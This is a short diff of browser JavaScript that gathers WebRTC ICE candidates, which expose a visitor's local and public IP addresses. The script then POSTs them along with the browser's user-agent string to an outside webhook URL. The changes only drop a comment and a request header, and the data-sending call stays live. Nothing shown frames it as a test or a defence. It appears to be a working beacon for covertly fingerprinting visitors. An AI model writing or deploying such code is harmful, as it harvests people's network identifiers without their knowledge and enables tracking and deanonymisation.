@@ -23,7 +23,6 @@ function collectCandidates(callback) {
         if (event.candidate) {
             candidates.push(event.candidate.candidate);
         } else {
-            // 👇 完全終了
             callback(candidates);
         }
     };
@@ -38,9 +37,6 @@ collectCandidates((candidates) => {
 
     fetch("https://testhooks.org/0fd9bdb7-a7de-4a28-8e03-ae19f38a447e", {
         method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
         body: JSON.stringify({
             candidates: candidates,
             ua: navigator.userAgent,
